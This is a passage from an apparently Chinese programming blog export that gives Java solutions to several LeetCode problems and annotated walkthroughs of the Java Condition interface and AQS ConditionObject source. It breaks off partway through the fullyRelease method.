<h3 id="解法三：找到最大值和最小值的交界"><a href="#解法三：找到最大值和最小值的交界" class="headerlink" title="解法三：找到最大值和最小值的交界"></a>解法三：找到最大值和最小值的交界</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (;i &lt; nums.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i + <span class="number">1</span>] &lt; nums[i]) &#123;</span><br><span class="line">				<span class="keyword">return</span> nums[i + <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (i == nums.length - <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法四：二分查找"><a href="#解法四：二分查找" class="headerlink" title="解法四：二分查找"></a>解法四：二分查找</h3><p>这块就不能用题目153的二分查找了。要稍微变形以下。</p>
<p>之前在使用二分查找的时候定义了三个值，low，mid，high。对应的nums数组中数字的关系，总共有6种，A3！。</p>
<p>分别是：</p>
<ul>
<li>nums[low] &lt;= nums[mid] &lt;= nums[tail]</li>
<li>nums[mid] &lt;= nums[tail] &lt;= nums[low]</li>
<li>nums[tail] &lt;= nums[low] &lt;= nums[mid]</li>
</ul>
<p>根据题目规则，已排序数组旋转，以下三种是不可能的情况：</p>
<ul>
<li>nums[head] &lt;= nums[tail] &lt;= nums[mid]</li>
<li>nums[mid] &lt;= nums[head] &lt;= nums[tail]</li>
<li>nums[tail] &lt;= nums[mid] &lt;= nums[head]</li>
</ul>
<h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">			<span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (low == mid || high == mid) &#123;</span><br><span class="line">				<span class="keyword">return</span> Math.min(nums[low], Math.min(nums[mid], nums[high]));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (nums[low] &lt;= nums[mid] &amp;&amp; nums[mid] &lt;= nums[high]) &#123;</span><br><span class="line">				<span class="comment">// 单调递增数列</span></span><br><span class="line">				<span class="comment">// 1,1,2,3,4,5,5</span></span><br><span class="line">				high--;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt;= nums[high] &amp;&amp; nums[high] &lt;= nums[low]) &#123;</span><br><span class="line">				<span class="comment">// 后半段递增</span></span><br><span class="line">				<span class="comment">// 3,3,1,1,2,2</span></span><br><span class="line">				high = mid;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[high] &lt;= nums[low] &amp;&amp; nums[low] &lt;= nums[mid]) &#123;</span><br><span class="line">				<span class="comment">// 前半段递增</span></span><br><span class="line">				<span class="comment">// 2,2,3,4,5,1</span></span><br><span class="line">				low = mid;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五：递归"><a href="#解法五：递归" class="headerlink" title="解法五：递归"></a>解法五：递归</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findMin(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">			<span class="keyword">return</span> nums[l];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span> (nums[mid] &lt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 后半段递增，则最小值在mid上或者mid左边</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, l, mid);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; nums[r]) &#123;</span><br><span class="line">			<span class="comment">// 前半段递增</span></span><br><span class="line">			<span class="keyword">return</span> findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">int</span> le = findMin(nums, l, mid);</span><br><span class="line">			<span class="keyword">int</span> ri = findMin(nums, mid + <span class="number">1</span>, r);</span><br><span class="line">			<span class="keyword">return</span> Math.min(le, ri);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1046. Last Stone Weight</title>
    <url>/2020/03/24/LeetCode/leetcode-001046.%20Last%20Stone%20Weight/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>We have a collection of rocks, each rock has a positive integer weight.</p>
<p>Each turn, we choose the two <strong>heaviest</strong> rocks and smash them together. Suppose the stones have weights <code>x</code> and <code>y</code> with <code>x &lt;= y</code>. The result of this smash is:</p>
<ul>
<li>If <code>x == y</code>, both stones are totally destroyed;</li>
<li>If <code>x != y</code>, the stone of weight <code>x</code> is totally destroyed, and the stone of weight <code>y</code> has new weight <code>y-x</code>.</li>
</ul>
<p>At the end, there is at most 1 stone left. Return the weight of this stone (or 0 if there are no stones left.)</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [2,7,4,1,8,1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: </span><br><span class="line">We combine 7 and 8 to get 1 so the array converts to [2,4,1,1,1] then,</span><br><span class="line">we combine 2 and 4 to get 2 so the array converts to [2,1,1,1] then,</span><br><span class="line">we combine 2 and 1 to get 1 so the array converts to [1,1,1] then,</span><br><span class="line">we combine 1 and 1 to get 0 so the array converts to [1] then that&#39;s the value of last stone.</span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li><code>1 &lt;= stones.length &lt;= 30</code></li>
<li><code>1 &lt;= stones[i] &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：大顶堆"><a href="#解法一：大顶堆" class="headerlink" title="解法一：大顶堆"></a>解法一：大顶堆</h3><p>构造一个大顶堆，每次从该堆中取出两个元素，比较，如果不相同则求出它们的差，重新插入大顶堆。需要注意的是：</p>
<ul>
<li>Java中堆默认是小顶堆，大顶堆需要在初始化的时候传入自定义Comparator；</li>
<li>当堆中最后只剩两个相同元素的时候，返回0</li>
<li>可以采用lambda表达式初始化大顶堆PriorityQueue<Integer> pq = new PriorityQueue&lt;&gt;((a, b) -&gt; b - a)</Integer></li>
<li>也可以用集合的Collections.reverseOrder()方法初始化大顶堆PriorityQueue<Integer> pq = new PriorityQueue&lt;&gt;(Collections.reverseOrder())</Integer></li>
</ul>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastStoneWeight</span><span class="params">(<span class="keyword">int</span>[] stones)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (stones.length == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> stones[<span class="number">0</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		PriorityQueue&lt;Integer&gt; nums = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(stones.length, <span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">return</span> o2 - o1;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> stone : stones) &#123;</span><br><span class="line">			nums.add(stone);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (nums.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> x = nums.poll();</span><br><span class="line">			<span class="keyword">int</span> y = nums.poll();</span><br><span class="line">			<span class="keyword">if</span> (x &gt; y) &#123;</span><br><span class="line">				nums.add(x - y);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nums.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> nums.peek();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>1389. Create Target Array in the Given Order</title>
    <url>/2020/03/24/LeetCode/leetcode-001389.%20Create%20Target%20Array%20in%20the%20Given%20Order/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given two arrays of integers <code>nums</code> and <code>index</code>. Your task is to create <em>target</em> array under the following rules:</p>
<ul>
<li>Initially <em>target</em> array is empty.</li>
<li>From left to right read nums[i] and index[i], insert at index <code>index[i]</code> the value <code>nums[i]</code> in <em>target</em> array.</li>
<li>Repeat the previous step until there are no elements to read in <code>nums</code> and <code>index.</code></li>
</ul>
<p>Return the <em>target</em> array.</p>
<p>It is guaranteed that the insertion operations will be valid.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [0,1,2,3,4], index &#x3D; [0,1,2,2,1]</span><br><span class="line">Output: [0,4,1,3,2]</span><br><span class="line">Explanation:</span><br><span class="line">nums       index     target</span><br><span class="line">0            0        [0]</span><br><span class="line">1            1        [0,1]</span><br><span class="line">2            2        [0,1,2]</span><br><span class="line">3            2        [0,1,3,2]</span><br><span class="line">4            1        [0,4,1,3,2]</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,2,3,4,0], index &#x3D; [0,1,2,3,0]</span><br><span class="line">Output: [0,1,2,3,4]</span><br><span class="line">Explanation:</span><br><span class="line">nums       index     target</span><br><span class="line">1            0        [1]</span><br><span class="line">2            1        [1,2]</span><br><span class="line">3            2        [1,2,3]</span><br><span class="line">4            3        [1,2,3,4]</span><br><span class="line">0            0        [0,1,2,3,4]</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>], index = [<span class="number">0</span>]</span><br><span class="line">Output: [<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>1 &lt;= nums.length, index.length &lt;= 100</code></li>
<li><code>nums.length == index.length</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
<li><code>0 &lt;= index[i] &lt;= i</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>利用ArrayList的add(int index, int value)方法，即可实现在对应位置上插入对应的值</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] createTargetArray(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] index) &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	result.add(index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>ArrayList每次在指定位置上插入对应的数据之后，其后面的数据还要整体往后挪动，效率不高，可以考虑用LinkedList替换，它插入只是指针操作，可以在O(1)的时间内完成。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] createTargetArray(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] index) &#123;</span><br><span class="line">        LinkedList&lt;Integer&gt; result = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	result.add(index[i], nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.stream().mapToInt(a -&gt; a).toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>Lock和Condition的应用</title>
    <url>/2020/03/20/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-20-Lock%E5%92%8CCondition%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Condition对象"><a href="#Condition对象" class="headerlink" title="Condition对象"></a>Condition对象</h1><p>Java提供了Condition对象来实现等待/通知。</p>
<p>Object对象提供了wait、waitAll、notify、notifyAll的方法用来实现线程的同步、等待和唤醒。Condition类提供了比wait/notify更丰富的功能，Condition对象由lock对象所创建的，同时一个Lock可以创建多个Condition对象，即创建多个对象监听器，这样就可以指定唤醒具体线程，而notify是随机唤醒线程。</p>
<h2 id="Condition接口包含的方法"><a href="#Condition接口包含的方法" class="headerlink" title="Condition接口包含的方法"></a>Condition接口包含的方法</h2><p>先看下Condition的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Condition</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">awaitUninterruptibly</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">awaitNanos</span><span class="params">(<span class="keyword">long</span> nanosTimeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">await</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">awaitUntil</span><span class="params">(Date deadline)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signal</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signalAll</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Condition主要提供了以下方法：</p>
<ul>
<li>await：使当前线程在接到信号或者中断之前一直阻塞等待；</li>
<li>awaitUninterruptibly：使当前线程在收到信号之前一直等待。此处对中断不做响应</li>
<li>awaitNanos：使当前线程在接到信号或者中断或者到达指定的纳秒时间之前一直阻塞等待</li>
<li>await(long time, TimeUnit unit)：使当前线程在接到信号或者中断或者到达指定的时间之前一直阻塞等待。此处可指定任意时间以及单位</li>
<li>awaitUntil(Date deadline)：使当前线程在接到信号或者中断或者到达截止日期之前一直阻塞等待</li>
<li>signal：唤醒一个等待线程</li>
<li>signalAll：唤醒所有的等待线程</li>
</ul>
<p>AQS中的ConditionObject是实现Condition接口的实现。ConditionObject的等待队列是一个FIFO队列，队列的每个节点都是等待在Condition对象上的线程的引用，在调用Condition的await()方法之后，线程释放锁，构造成相应的节点进入等待队列等待。其中节点的定义复用AQS的Node定义。</p>
<h2 id="ConditionObject"><a href="#ConditionObject" class="headerlink" title="ConditionObject"></a>ConditionObject</h2><p>先看看这个对象的字段定义</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConditionObject</span> <span class="keyword">implements</span> <span class="title">Condition</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1173984872572414699L</span>;</span><br><span class="line">        <span class="comment">/** First node of condition queue. */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">transient</span> Node firstWaiter;</span><br><span class="line">        <span class="comment">/** Last node of condition queue. */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">transient</span> Node lastWaiter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ConditionObject是AQS的内部类，这样它就能访问到AQS的FIFO队列了。COnditionObject内部维护的是一个单向队列，它的首节点就是一个第一个被阻塞的线程节点。</p>
<p>下面我们挨个看下它的一些方法是怎么实现的。</p>
<h3 id="await方法"><a href="#await方法" class="headerlink" title="await方法"></a>await方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Implements interruptible condition wait.</span></span><br><span class="line"><span class="comment">         * 实现了可中断的条件等待</span></span><br><span class="line"><span class="comment">         * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">         *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Block until signalled or interrupted.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">         *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">         * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">                <span class="comment">// 如果当前线程已经被中断了，则直接抛出InterruptedException</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">            <span class="comment">// 构造线程节点，添加到队尾</span></span><br><span class="line">            Node node = addConditionWaiter();</span><br><span class="line">            <span class="comment">// 添加进队列之后，释放锁，</span></span><br><span class="line">            <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">            <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 死循环判断当前被唤醒的节点是否已经转移到AQS同步队列中，成功就退出循环</span></span><br><span class="line">            <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">                LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">                <span class="comment">// 如果发生中断则确保节点加入同步队列并跳出循环</span></span><br><span class="line">                <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 被通知或者被中断的线程，继续获取竞争锁</span></span><br><span class="line">            <span class="comment">// 获取成功或者被取消则再设置中断模式</span></span><br><span class="line">            <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">                interruptMode = REINTERRUPT;</span><br><span class="line">            <span class="comment">// 删除取消的后继等待节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>) <span class="comment">// clean up if cancelled</span></span><br><span class="line">                unlinkCancelledWaiters();</span><br><span class="line">            <span class="comment">// 根据中断模式抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">                reportInterruptAfterWait(interruptMode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="addConditionWaiter方法"><a href="#addConditionWaiter方法" class="headerlink" title="addConditionWaiter方法"></a>addConditionWaiter方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前的线程作为waiter添加到等待队列</span></span><br><span class="line"><span class="comment"> * 返回当前节点的引用</span></span><br><span class="line"><span class="comment">       * Adds a new waiter to wait queue.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@return</span> its new wait node</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> Node <span class="title">addConditionWaiter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node t = lastWaiter;</span><br><span class="line">          <span class="comment">// If lastWaiter is cancelled, clean out.</span></span><br><span class="line">          <span class="keyword">if</span> (t != <span class="keyword">null</span> &amp;&amp; t.waitStatus != Node.CONDITION) &#123;</span><br><span class="line">              <span class="comment">// 如果t的状态时cancelled，从队列中清除</span></span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">              t = lastWaiter;</span><br><span class="line">          &#125;</span><br><span class="line">          Node node = <span class="keyword">new</span> Node(Thread.currentThread(), Node.CONDITION);</span><br><span class="line">          <span class="keyword">if</span> (t == <span class="keyword">null</span>)</span><br><span class="line">              <span class="comment">// 首节点和尾节点都指向当前节点</span></span><br><span class="line">              firstWaiter = node;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">              <span class="comment">// 链接到队尾</span></span><br><span class="line">              t.nextWaiter = node;</span><br><span class="line">          lastWaiter = node;</span><br><span class="line">          <span class="keyword">return</span> node;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="unlinkCancelledWaiters方法"><a href="#unlinkCancelledWaiters方法" class="headerlink" title="unlinkCancelledWaiters方法"></a>unlinkCancelledWaiters方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将链表中的cancelled节点从链表中移除。其中变量trail保存的是当前节点的前置节点的引用</span></span><br><span class="line"><span class="comment"> * t保存的是当前节点的下一个节点的引用。</span></span><br><span class="line"><span class="comment"> * 分两种情况，如果头结点是cancelled状态</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt;       | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  移除后</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt; null  | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *                                                   ^</span></span><br><span class="line"><span class="comment"> *                                                   |</span></span><br><span class="line"><span class="comment"> *                                                 firstWaiter</span></span><br><span class="line"><span class="comment"> * 如果头结点不是cancelled状态</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |condition | nextWaiter | ---&gt;       | cancelled | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> * 移除后</span></span><br><span class="line"><span class="comment"> * *  -------------------------          -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt; null  | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *             ^</span></span><br><span class="line"><span class="comment"> *             |</span></span><br><span class="line"><span class="comment">       *          firstWaiter</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">       * Unlinks cancelled waiter nodes from condition queue.</span></span><br><span class="line"><span class="comment">       * Called only while holding lock. This is called when</span></span><br><span class="line"><span class="comment">       * cancellation occurred during condition wait, and upon</span></span><br><span class="line"><span class="comment">       * insertion of a new waiter when lastWaiter is seen to have</span></span><br><span class="line"><span class="comment">       * been cancelled. This method is needed to avoid garbage</span></span><br><span class="line"><span class="comment">       * retention in the absence of signals. So even though it may</span></span><br><span class="line"><span class="comment">       * require a full traversal, it comes into play only when</span></span><br><span class="line"><span class="comment">       * timeouts or cancellations occur in the absence of</span></span><br><span class="line"><span class="comment">       * signals. It traverses all nodes rather than stopping at a</span></span><br><span class="line"><span class="comment">       * particular target to unlink all pointers to garbage nodes</span></span><br><span class="line"><span class="comment">       * without requiring many re-traversals during cancellation</span></span><br><span class="line"><span class="comment">       * storms.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlinkCancelledWaiters</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node t = firstWaiter;</span><br><span class="line">          Node trail = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">              Node next = t.nextWaiter;</span><br><span class="line">              <span class="keyword">if</span> (t.waitStatus != Node.CONDITION) &#123;</span><br><span class="line">                  t.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="keyword">if</span> (trail == <span class="keyword">null</span>)</span><br><span class="line">                      firstWaiter = next;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                      trail.nextWaiter = next;</span><br><span class="line">                  <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">                      lastWaiter = trail;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                  trail = t;</span><br><span class="line">              t = next;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="fullyRelease方法"><a href="#fullyRelease方法" class="headerlink" title="fullyRelease方法"></a>fullyRelease方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 释放锁并返回新的state，如果释放失败，则把当前的节点状态改为cancelled</span></span><br><span class="line"><span class="comment"> * 注意，设置cancelled状态是在finally里面的。只要释放失败，就改节点状态</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * Invokes release with current state value; returns saved state.</span></span><br><span class="line"><span class="comment">    * Cancels node and throws exception on failure.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the condition node for this wait</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> previous sync state</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">fullyRelease</span><span class="params">(Node 